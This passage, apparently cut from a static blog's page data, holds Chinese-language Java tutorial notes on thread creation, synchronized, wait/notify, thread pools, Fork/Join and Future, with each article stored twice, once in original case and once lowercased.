线程同步",slug:"_2-线程同步",normalizedTitle:"2. 线程同步",charIndex:1142},{level:3,title:"2.1 不需要synchronized的操作",slug:"_2-1-不需要synchronized的操作",normalizedTitle:"2.1 不需要synchronized的操作",charIndex:3546},{level:2,title:"3. 线程通信wait与notify",slug:"_3-线程通信wait与notify",normalizedTitle:"3. 线程通信wait与notify",charIndex:3776}],headersStr:"1. 创建线程 1.1 创建线程的两种方式 2. 线程同步 2.1 不需要synchronized的操作 3. 线程通信wait与notify",content:'# 1. 创建线程\n\n\n# 1.1 创建线程的两种方式\n\n 1. 继承Thread类\n    \n    public class MyThread extends Thread{\n        @Override\n        public void run() {\n            System.out.println(getName()+"---\x3erun");\n        }\n    \n        public static void main(String[] args) throws InterruptedException {\n            Thread a = new MyThread();\n            Thread b = new MyThread();\n            a.start();\n            b.start();\n            a.join();\n            b.join();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 2. 实现Runnable接口\n    \n    public static void main(String[] args) {\n        Runnable runnable = new Runnable() {\n            @Override\n            public void run() {\n                System.out.println("i\'m runnable");\n            }\n        };\n        new Thread(runnable).start();\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n    \n    简写：\n    \n    public static void main(String[] args) {\n        new Thread(()->{\n            System.out.println("i\'m simple");\n        }).start();\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 2. 线程同步\n\n如果不设置同步\n\nclass MyRunnableImpl implements Runnable{\n    private int x = 0;\n    @Override\n    public void run() {\n        for(int i =0;i<10000;i++){\n            x = x+1;\n            x = x-1;\n        }\n    }\n\n    public int getX() {\n        return x;\n    }\n}\n\npublic class SyncTest {\n    public static void main(String[] args) throws InterruptedException {\n        MyRunnableImpl runnable = new MyRunnableImpl();\n        Thread thread = new Thread(runnable);\n        Thread thread2 = new Thread(runnable);\n        thread.start();\n        thread2.start();\n        thread.join();\n        thread2.join();\n        System.out.println(runnable.getX());\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n此次程序运行结果：28\n\n但是根据程序的逻辑来讲应该是0，而结果不是0的原因就是没有同步\n\n通过synchronized关键字来设置同步\n\nclass MyRunnableImpl implements Runnable{\n    private int x = 0;\n    @Override\n    public void run() {\n        for(int i =0;i<10000;i++){\n            synchronized (this){\n                x = x+1;\n                x = x-1;\n            }\n        }\n    }\n\n    public int getX() {\n        return x;\n    }\n}\n\npublic class SyncTest {\n    public static void main(String[] args) throws InterruptedException {\n        MyRunnableImpl runnable = new MyRunnableImpl();\n        Thread thread = new Thread(runnable);\n        Thread thread2 = new Thread(runnable);\n        thread.start();\n        thread2.start();\n        thread.join();\n        thread2.join();\n        System.out.println(runnable.getX());\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n运行结果为0\n\nsynchronized关键字还可以加在函数上表示对函数体的内容进行加锁\n\nclass MyRunnableImpl implements Runnable{\n    private int x = 0;\n    @Override\n    public synchronized void run() {\n        for(int i =0;i<10000;i++){\n                x = x+1;\n                x = x-1;\n        }\n    }\n\n    public int getX() {\n        return x;\n    }\n}\n\npublic class SyncTest {\n    public static void main(String[] args) throws InterruptedException {\n        MyRunnableImpl runnable = new MyRunnableImpl();\n        Thread thread = new Thread(runnable);\n        Thread thread2 = new Thread(runnable);\n        thread.start();\n        thread2.start();\n        thread.join();\n        thread2.join();\n        System.out.println(runnable.getX());\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 2.1 不需要synchronized的操作\n\nJVM规范定义了几种原子操作：\n\n * 基本类型（long和double除外）赋值，例如：int n = m；\n * 引用类型赋值，例如：List<String> list = anotherList。\n\nlong和double是64位数据，JVM没有明确规定64位赋值操作是不是一个原子操作，不过在x64平台的JVM是把long和double的赋值作为原子操作实现的。\n\n单条原子操作的语句不需要同步\n\n\n# 3. 线程通信wait与notify\n\nwait、notify、notifyAll 三个方法均必须在synchronized下才是使用，而且调用方必须是synchronized的锁对象，如果是其他对象调用，则会报错\n\n且notify和notifyAll所唤醒的线程是同一个锁对象的等待状态的线程\n\n一个例子\n\nclass Patient implements Runnable {\n    //生病 生病后唤醒医生给病人治病\n    public synchronized void ill() {\n        Hospital.patientNumber++;\n        System.out.println("get cold  ---\x3e" + Hospital.patientNumber);\n        notifyAll();\n    }\n\n    @Override\n    public void run() {\n        ill();\n    }\n}\n\nclass Doctor implements Runnable {\n    //治疗 如果没有病人就等待 如果有就被唤醒 给人治病\n    public synchronized void treat() throws InterruptedException {\n        while (Hospital.patientNumber <= 0) {\n            wait();\n        }\n        Hospital.patientNumber--;\n        System.out.println("drink more hot water  ---\x3e" + Hospital.patientNumber);\n    }\n\n    @Override\n    public void run() {\n        try {\n            treat();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass Hospital {\n    public static int patientNumber = 0;\n}\n\npublic class WaitAndNotifyTest {\n\n    public static void main(String[] args) {\n        Patient patient = new Patient();\n        Doctor doctor = new Doctor();\n\n        for (int i = 0; i < 10; i++) {\n            new Thread(doctor).start();\n        }\n\n        for (int i = 0; i < 10; i++) {\n            new Thread(patient).start();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n结果是 原因就是两个函数的锁对象不同，所以病人生病并不能唤醒医生（其实，锁对象不同 对于Hospital.patientNumber这个变量的修改并没有有效的同步保护，只是Doctor和Doctor线程、Patient和Patient线程之间不能同时访问，因为是同一个锁，但是Doctor和Patient线程之间还是有可能同时访问，因为他们的锁不同）\n\n修改代码如下：\n\nclass Patient implements Runnable {\n    //生病 生病后唤醒医生给病人治病\n    public void ill() {\n        synchronized (Hospital.class) {//注意锁的变化\n            Hospital.patientNumber++;\n            System.out.println("get cold  ---\x3e" + Hospital.patientNumber);\n            Hospital.class.notifyAll();//注意调用对象的变化\n        }\n    }\n\n    @Override\n    public void run() {\n        ill();\n    }\n}\n\nclass Doctor implements Runnable {\n    //治疗 如果没有病人就等待 如果有就被唤醒 给人治病\n    public void treat() {\n        synchronized (Hospital.class) {//注意锁的变化\n            while (Hospital.patientNumber <= 0) {\n                try {\n                    Hospital.class.wait();//注意调用对象的变化\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            Hospital.patientNumber--;\n            System.out.println("drink more hot water  ---\x3e" + Hospital.patientNumber);\n        }\n    }\n\n    @Override\n    public void run() {\n        treat();\n    }\n}\n\nclass Hospital {\n    public static int patientNumber = 0;\n}\n\npublic class WaitAndNotifyTest {\n\n    public static void main(String[] args) {\n        Patient patient = new Patient();\n        Doctor doctor = new Doctor();\n\n        for (int i = 0; i < 10; i++) {\n            new Thread(doctor).start();\n        }\n\n        for (int i = 0; i < 10; i++) {\n            new Thread(patient).start();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n结果如下：\n\n如果遇到错误java.lang.IllegalMonitorStateException:说明synchronized的锁对象和调用wait还有notify的对象不一致（因为Wait()需要释放锁，如果调用的对象不是这个锁对象就无法释放掉这个锁）',normalizedContent:'# 1. 创建线程\n\n\n# 1.1 创建线程的两种方式\n\n 1. 继承thread类\n    \n    public class mythread extends thread{\n        @override\n        public void run() {\n            system.out.println(getname()+"---\x3erun");\n        }\n    \n        public static void main(string[] args) throws interruptedexception {\n            thread a = new mythread();\n            thread b = new mythread();\n            a.start();\n            b.start();\n            a.join();\n            b.join();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 2. 实现runnable接口\n    \n    public static void main(string[] args) {\n        runnable runnable = new runnable() {\n            @override\n            public void run() {\n                system.out.println("i\'m runnable");\n            }\n        };\n        new thread(runnable).start();\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n    \n    简写：\n    \n    public static void main(string[] args) {\n        new thread(()->{\n            system.out.println("i\'m simple");\n        }).start();\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n\n# 2. 线程同步\n\n如果不设置同步\n\nclass myrunnableimpl implements runnable{\n    private int x = 0;\n    @override\n    public void run() {\n        for(int i =0;i<10000;i++){\n            x = x+1;\n            x = x-1;\n        }\n    }\n\n    public int getx() {\n        return x;\n    }\n}\n\npublic class synctest {\n    public static void main(string[] args) throws interruptedexception {\n        myrunnableimpl runnable = new myrunnableimpl();\n        thread thread = new thread(runnable);\n        thread thread2 = new thread(runnable);\n        thread.start();\n        thread2.start();\n        thread.join();\n        thread2.join();\n        system.out.println(runnable.getx());\n\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n此次程序运行结果：28\n\n但是根据程序的逻辑来讲应该是0，而结果不是0的原因就是没有同步\n\n通过synchronized关键字来设置同步\n\nclass myrunnableimpl implements runnable{\n    private int x = 0;\n    @override\n    public void run() {\n        for(int i =0;i<10000;i++){\n            synchronized (this){\n                x = x+1;\n                x = x-1;\n            }\n        }\n    }\n\n    public int getx() {\n        return x;\n    }\n}\n\npublic class synctest {\n    public static void main(string[] args) throws interruptedexception {\n        myrunnableimpl runnable = new myrunnableimpl();\n        thread thread = new thread(runnable);\n        thread thread2 = new thread(runnable);\n        thread.start();\n        thread2.start();\n        thread.join();\n        thread2.join();\n        system.out.println(runnable.getx());\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n运行结果为0\n\nsynchronized关键字还可以加在函数上表示对函数体的内容进行加锁\n\nclass myrunnableimpl implements runnable{\n    private int x = 0;\n    @override\n    public synchronized void run() {\n        for(int i =0;i<10000;i++){\n                x = x+1;\n                x = x-1;\n        }\n    }\n\n    public int getx() {\n        return x;\n    }\n}\n\npublic class synctest {\n    public static void main(string[] args) throws interruptedexception {\n        myrunnableimpl runnable = new myrunnableimpl();\n        thread thread = new thread(runnable);\n        thread thread2 = new thread(runnable);\n        thread.start();\n        thread2.start();\n        thread.join();\n        thread2.join();\n        system.out.println(runnable.getx());\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 2.1 不需要synchronized的操作\n\njvm规范定义了几种原子操作：\n\n * 基本类型（long和double除外）赋值，例如：int n = m；\n * 引用类型赋值，例如：list<string> list = anotherlist。\n\nlong和double是64位数据，jvm没有明确规定64位赋值操作是不是一个原子操作，不过在x64平台的jvm是把long和double的赋值作为原子操作实现的。\n\n单条原子操作的语句不需要同步\n\n\n# 3. 线程通信wait与notify\n\nwait、notify、notifyall 三个方法均必须在synchronized下才是使用，而且调用方必须是synchronized的锁对象，如果是其他对象调用，则会报错\n\n且notify和notifyall所唤醒的线程是同一个锁对象的等待状态的线程\n\n一个例子\n\nclass patient implements runnable {\n    //生病 生病后唤醒医生给病人治病\n    public synchronized void ill() {\n        hospital.patientnumber++;\n        system.out.println("get cold  ---\x3e" + hospital.patientnumber);\n        notifyall();\n    }\n\n    @override\n    public void run() {\n        ill();\n    }\n}\n\nclass doctor implements runnable {\n    //治疗 如果没有病人就等待 如果有就被唤醒 给人治病\n    public synchronized void treat() throws interruptedexception {\n        while (hospital.patientnumber <= 0) {\n            wait();\n        }\n        hospital.patientnumber--;\n        system.out.println("drink more hot water  ---\x3e" + hospital.patientnumber);\n    }\n\n    @override\n    public void run() {\n        try {\n            treat();\n        } catch (interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n}\n\nclass hospital {\n    public static int patientnumber = 0;\n}\n\npublic class waitandnotifytest {\n\n    public static void main(string[] args) {\n        patient patient = new patient();\n        doctor doctor = new doctor();\n\n        for (int i = 0; i < 10; i++) {\n            new thread(doctor).start();\n        }\n\n        for (int i = 0; i < 10; i++) {\n            new thread(patient).start();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n结果是 原因就是两个函数的锁对象不同，所以病人生病并不能唤醒医生（其实，锁对象不同 对于hospital.patientnumber这个变量的修改并没有有效的同步保护，只是doctor和doctor线程、patient和patient线程之间不能同时访问，因为是同一个锁，但是doctor和patient线程之间还是有可能同时访问，因为他们的锁不同）\n\n修改代码如下：\n\nclass patient implements runnable {\n    //生病 生病后唤醒医生给病人治病\n    public void ill() {\n        synchronized (hospital.class) {//注意锁的变化\n            hospital.patientnumber++;\n            system.out.println("get cold  ---\x3e" + hospital.patientnumber);\n            hospital.class.notifyall();//注意调用对象的变化\n        }\n    }\n\n    @override\n    public void run() {\n        ill();\n    }\n}\n\nclass doctor implements runnable {\n    //治疗 如果没有病人就等待 如果有就被唤醒 给人治病\n    public void treat() {\n        synchronized (hospital.class) {//注意锁的变化\n            while (hospital.patientnumber <= 0) {\n                try {\n                    hospital.class.wait();//注意调用对象的变化\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                }\n            }\n            hospital.patientnumber--;\n            system.out.println("drink more hot water  ---\x3e" + hospital.patientnumber);\n        }\n    }\n\n    @override\n    public void run() {\n        treat();\n    }\n}\n\nclass hospital {\n    public static int patientnumber = 0;\n}\n\npublic class waitandnotifytest {\n\n    public static void main(string[] args) {\n        patient patient = new patient();\n        doctor doctor = new doctor();\n\n        for (int i = 0; i < 10; i++) {\n            new thread(doctor).start();\n        }\n\n        for (int i = 0; i < 10; i++) {\n            new thread(patient).start();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n结果如下：\n\n如果遇到错误java.lang.illegalmonitorstateexception:说明synchronized的锁对象和调用wait还有notify的对象不一致（因为wait()需要释放锁，如果调用的对象不是这个锁对象就无法释放掉这个锁）',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java 线程池",frontmatter:{title:"java 线程池",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/6998f2/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/01.java%20%E7%BA%BF%E7%A8%8B%E6%B1%A0.html",relativePath:"04.java/03.多线程/01.java 线程池.md",key:"v-1ec80cec",path:"/pages/6998f2/",headers:[{level:2,title:"FixedThreadPool",slug:"fixedthreadpool",normalizedTitle:"fixedthreadpool",charIndex:316},{level:2,title:"CachedThreadPool",slug:"cachedthreadpool",normalizedTitle:"cachedthreadpool",charIndex:349},{level:2,title:"特殊的线程池",slug:"特殊的线程池",normalizedTitle:"特殊的线程池",charIndex:1617},{level:3,title:"ScheduledThreadPool",slug:"scheduledthreadpool",normalizedTitle:"scheduledthreadpool",charIndex:1628},{level:2,title:"Fork/Join线程池",slug:"fork-join线程池",normalizedTitle:"fork/join线程池",charIndex:2705}],headersStr:"FixedThreadPool CachedThreadPool 特殊的线程池 ScheduledThreadPool Fork/Join线程池",content:"不用线程池的时候，使用线程是创建Thread线程对象，然后启动线程 java 多线程的基本使用\n\n而在使用线程池的时候，不需要获得某一个具体用来的执行的Thread对象，而是直接将Runable对象（或者Callable对象）交给ExecutorService,它会自动获取线程，来完成相应的任务，即使用方法如下：\n\n 1. 使用Executors对象创建ExecutorService对象\n 2. ExecutorService对象调用submit提交Runnable或者Callable任务\n\nExecutorService只是接口，Java标准库提供的几个常用实现类有：\n\nEXECUTORSERVICE的实现类    描述\nFixedThreadPool        线程数固定的线程池\nCachedThreadPool       线程数根据任务动态调整的线程池\nSingleThreadExecutor   仅单线程执行的线程池\n\n需要注意的是：线程池在程序结束的时候要关闭，否则程序自己不会结束\n\n关闭线程池的方法下面几个：\n\n方法名                  描述\nshutdown()           关闭线程池的时候，它会等待正在执行的任务先完成，然后再关闭\nshutdownNow()        立刻停止正在执行的任务\nawaitTermination()   等待指定的时间让线程池关闭。\n\n\n# FixedThreadPool\n\nExecutorService es = Executors.newFixedThreadPool(4);\nfor (int i = 0; i < 10; i++) {\n    es.submit(()->{\n        System.out.println(Thread.currentThread().getName());\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n运行结果\n\n> pool-1-thread-1\n> pool-1-thread-4\n> pool-1-thread-3\n> pool-1-thread-4\n> pool-1-thread-2\n> pool-1-thread-1\n> pool-1-thread-2\n> pool-1-thread-1\n> pool-1-thread-2\n> pool-1-thread-3\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n\n\n# CachedThreadPool\n\nExecutorService es = Executors.newCachedThreadPool();\nfor (int i = 0; i < 10; i++) {\n    es.submit(()->{\n        System.out.println(Thread.currentThread().getName());\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n运行结果：\n\n> pool-1-thread-1 pool-1-thread-5 pool-1-thread-4 pool-1-thread-3 pool-1-thread-2 pool-1-thread-8 pool-1-thread-7 pool-1-thread-6 pool-1-thread-9 pool-1-thread-5\n\n如果想要设定线程池的大小范围，则\n\nint min = 4;\nint max = 10;\nExecutorService es = new ThreadPoolExecutor(min, max,60L, TimeUnit.SECONDS, new SynchronousQueue<Runnable>());\n\n\n1\n2\n3\n\n\n\n# 特殊的线程池\n\n\n# ScheduledThreadPool\n\n用于定期反复执行，比如动画一秒钟24次，那么每1/24秒就要执行一次切换画面的任务\n\n使用方法：\n\n 1. 创建ScheduledExecutorService对象\n\n 2. 提交任务\n    \n    提交任务的函数有下面三个\n    \n    * public ScheduledFuture<?> schedule(Runnable command,long delay, TimeUnit unit)\n      \n      定时执行任务，只执行一次\n      \n      * Runnable command : 要执行的线程的内容\n      \n      * long delay : 延迟的时间\n      \n      * TimeUnit unit ： 时间单位\n    \n    * public ScheduledFuture<?> scheduleAtFixedRate(Runnable command,long initialDelay,long period,TimeUnit unit)\n      \n      任务以固定的间隔执行\n      \n      * Runnable command ： 要执行的线程的内容\n      \n      * long initialDelay : 第一次延迟的时间\n      \n      * long period ： 间隔时间\n      \n      * TimeUnit unit ： 时间单位\n    \n    * public ScheduledFuture<?> scheduleWithFixedDelay(Runnable command,long initialDelay,long delay,TimeUnit unit)\n      \n      任务间以固定的间隔执行\n      \n      * Runnable command ：要执行的线程的内容\n      \n      * long initialDelay ：第一次延迟的时间\n      \n      * long delay ：间隔时间\n      \n      * TimeUnit unit ：时间单位\n\nFixedRate和FixedDelay的区别：\n\nFixedRate是指任务总是以固定时间间隔触发，不管任务执行多长时间 FixedDelay是指，上一次任务执行完毕后，等待固定的时间间隔，再执行下一次任务：\n\n\n# Fork/Join线程池\n\n它的作用是把一个大任务拆成多个小任务并行执行\n\n就比如归并排序算法，相当于把一个数组的排序，变成两个小的数组排序，再归并\n\n只是以前学数据结构去实现这个算法的时候，但是却没有对每个小部分进行多线程执行罢了\n\n而此处就是把这种大任务变成小任务的事情，对于每个小任务，进行多线程处理提高效率罢了\n\n定义方法\n\n 1. 定义一个类继承RecursiveTask<？>\n 2. 重写protected <?> compute(),用于将大问题化为小问题\n\nclass Sum extends RecursiveTask<Long>{\n\n    private long[] array;\n    private int start;\n    private int end;\n\n    public Sum(long[] array, int start, int end) {\n        this.array = array;\n        this.start = start;\n        this.end = end;\n    }\n\n    //用于将大问题化为小问题\n    @Override\n    protected Long compute() {\n        //问题足够小的时候\n        if(end - start < 10){\n            long sum = 0;\n            for (int i = start; i < end; i++) {\n                sum+=array[i];\n            }\n            return sum;\n        }else {//大问题化为小问题\n            int middle = (start+end)/2;\n            Sum left = new Sum(this.array, start, middle);\n            Sum right = new Sum(this.array, middle, end);\n            invokeAll(left,right);\n            Long leftSum = left.join();\n            Long rightSum = right.join();\n            return leftSum+rightSum;\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n使用方法：\n\npublic class ForkJoinTest {\n    public static void main(String[] args) {\n        long[] array = new long[2000];\n        for (int i = 0; i < 2000; i++) {\n            array[i] = 2;\n        }\n        \n        //创建对象\n        Sum sumTask = new Sum(array, 0, array.length);\n        //执行任务，并得到结果\n        Long result = ForkJoinPool.commonPool().invoke(sumTask);\n        System.out.println(result);\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n",normalizedContent:"不用线程池的时候，使用线程是创建thread线程对象，然后启动线程 java 多线程的基本使用\n\n而在使用线程池的时候，不需要获得某一个具体用来的执行的thread对象，而是直接将runable对象（或者callable对象）交给executorservice,它会自动获取线程，来完成相应的任务，即使用方法如下：\n\n 1. 使用executors对象创建executorservice对象\n 2. executorservice对象调用submit提交runnable或者callable任务\n\nexecutorservice只是接口，java标准库提供的几个常用实现类有：\n\nexecutorservice的实现类    描述\nfixedthreadpool        线程数固定的线程池\ncachedthreadpool       线程数根据任务动态调整的线程池\nsinglethreadexecutor   仅单线程执行的线程池\n\n需要注意的是：线程池在程序结束的时候要关闭，否则程序自己不会结束\n\n关闭线程池的方法下面几个：\n\n方法名                  描述\nshutdown()           关闭线程池的时候，它会等待正在执行的任务先完成，然后再关闭\nshutdownnow()        立刻停止正在执行的任务\nawaittermination()   等待指定的时间让线程池关闭。\n\n\n# fixedthreadpool\n\nexecutorservice es = executors.newfixedthreadpool(4);\nfor (int i = 0; i < 10; i++) {\n    es.submit(()->{\n        system.out.println(thread.currentthread().getname());\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n运行结果\n\n> pool-1-thread-1\n> pool-1-thread-4\n> pool-1-thread-3\n> pool-1-thread-4\n> pool-1-thread-2\n> pool-1-thread-1\n> pool-1-thread-2\n> pool-1-thread-1\n> pool-1-thread-2\n> pool-1-thread-3\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n\n\n# cachedthreadpool\n\nexecutorservice es = executors.newcachedthreadpool();\nfor (int i = 0; i < 10; i++) {\n    es.submit(()->{\n        system.out.println(thread.currentthread().getname());\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n运行结果：\n\n> pool-1-thread-1 pool-1-thread-5 pool-1-thread-4 pool-1-thread-3 pool-1-thread-2 pool-1-thread-8 pool-1-thread-7 pool-1-thread-6 pool-1-thread-9 pool-1-thread-5\n\n如果想要设定线程池的大小范围，则\n\nint min = 4;\nint max = 10;\nexecutorservice es = new threadpoolexecutor(min, max,60l, timeunit.seconds, new synchronousqueue<runnable>());\n\n\n1\n2\n3\n\n\n\n# 特殊的线程池\n\n\n# scheduledthreadpool\n\n用于定期反复执行，比如动画一秒钟24次，那么每1/24秒就要执行一次切换画面的任务\n\n使用方法：\n\n 1. 创建scheduledexecutorservice对象\n\n 2. 提交任务\n    \n    提交任务的函数有下面三个\n    \n    * public scheduledfuture<?> schedule(runnable command,long delay, timeunit unit)\n      \n      定时执行任务，只执行一次\n      \n      * runnable command : 要执行的线程的内容\n      \n      * long delay : 延迟的时间\n      \n      * timeunit unit ： 时间单位\n    \n    * public scheduledfuture<?> scheduleatfixedrate(runnable command,long initialdelay,long period,timeunit unit)\n      \n      任务以固定的间隔执行\n      \n      * runnable command ： 要执行的线程的内容\n      \n      * long initialdelay : 第一次延迟的时间\n      \n      * long period ： 间隔时间\n      \n      * timeunit unit ： 时间单位\n    \n    * public scheduledfuture<?> schedulewithfixeddelay(runnable command,long initialdelay,long delay,timeunit unit)\n      \n      任务间以固定的间隔执行\n      \n      * runnable command ：要执行的线程的内容\n      \n      * long initialdelay ：第一次延迟的时间\n      \n      * long delay ：间隔时间\n      \n      * timeunit unit ：时间单位\n\nfixedrate和fixeddelay的区别：\n\nfixedrate是指任务总是以固定时间间隔触发，不管任务执行多长时间 fixeddelay是指，上一次任务执行完毕后，等待固定的时间间隔，再执行下一次任务：\n\n\n# fork/join线程池\n\n它的作用是把一个大任务拆成多个小任务并行执行\n\n就比如归并排序算法，相当于把一个数组的排序，变成两个小的数组排序，再归并\n\n只是以前学数据结构去实现这个算法的时候，但是却没有对每个小部分进行多线程执行罢了\n\n而此处就是把这种大任务变成小任务的事情，对于每个小任务，进行多线程处理提高效率罢了\n\n定义方法\n\n 1. 定义一个类继承recursivetask<？>\n 2. 重写protected <?> compute(),用于将大问题化为小问题\n\nclass sum extends recursivetask<long>{\n\n    private long[] array;\n    private int start;\n    private int end;\n\n    public sum(long[] array, int start, int end) {\n        this.array = array;\n        this.start = start;\n        this.end = end;\n    }\n\n    //用于将大问题化为小问题\n    @override\n    protected long compute() {\n        //问题足够小的时候\n        if(end - start < 10){\n            long sum = 0;\n            for (int i = start; i < end; i++) {\n                sum+=array[i];\n            }\n            return sum;\n        }else {//大问题化为小问题\n            int middle = (start+end)/2;\n            sum left = new sum(this.array, start, middle);\n            sum right = new sum(this.array, middle, end);\n            invokeall(left,right);\n            long leftsum = left.join();\n            long rightsum = right.join();\n            return leftsum+rightsum;\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n使用方法：\n\npublic class forkjointest {\n    public static void main(string[] args) {\n        long[] array = new long[2000];\n        for (int i = 0; i < 2000; i++) {\n            array[i] = 2;\n        }\n        \n        //创建对象\n        sum sumtask = new sum(array, 0, array.length);\n        //执行任务，并得到结果\n        long result = forkjoinpool.commonpool().invoke(sumtask);\n        system.out.println(result);\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java 有返回值的线程",frontmatter:{title:"java 有返回值的线程",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/1a6f48/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/02.java%20%E6%9C%89%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E7%BA%BF%E7%A8%8B.html",relativePath:"04.java/03.多线程/02.java 有返回值的线程.md",key:"v-96a8abe0",path:"/pages/1a6f48/",headers:[{level:2,title:"Future",slug:"future",normalizedTitle:"future",charIndex:18},{level:2,title:"CompletableFuture",slug:"completablefuture",normalizedTitle:"completablefuture",charIndex:572},{level:3,title:"CompletableFuture还支持同一个线程串行操作",slug:"completablefuture还支持同一个线程串行操作",normalizedTitle:"completablefuture还支持同一个线程串行操作",charIndex:1055},{level:3,title:"CompletableFuture还支持多个线程并行操作",slug:"completablefuture还支持多个线程并行操作",normalizedTitle:"completablefuture还支持多个线程并行操作",charIndex:2188}],headersStr:"Future CompletableFuture CompletableFuture还支持同一个线程串行操作 CompletableFuture还支持多个线程并行操作",content:'java 多线程的基本使用\n\n\n# Future\n\nFuture<V>接口表示一个未来可能会返回的结果，它定义的方法有：\n\n * get()：获取结果（可能会等待）\n * get(long timeout, TimeUnit unit)：获取结果，但只等待指定的时间；\n * cancel(boolean mayInterruptIfRunning)：取消当前任务；\n * isDone()：判断任务是否已完成。\n\nExecutorService.submit()方法如果传入Callable对象，那么就可以返回一个Future对象，再调用一个get()方法就可以得到相应的结果,单说get()方法会导致阻塞，所以如果不想阻塞，只能通过isDone()去判断\n\nExecutorService es = Executors.newFixedThreadPool(5);\nFuture<String> futureString = es.submit(() -> {\n    Thread.sleep(3000);\n    return "hello";\n});\nSystem.out.println(futureString.get());//会阻塞到相应的线程执行完毕\nes.shutdown();\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 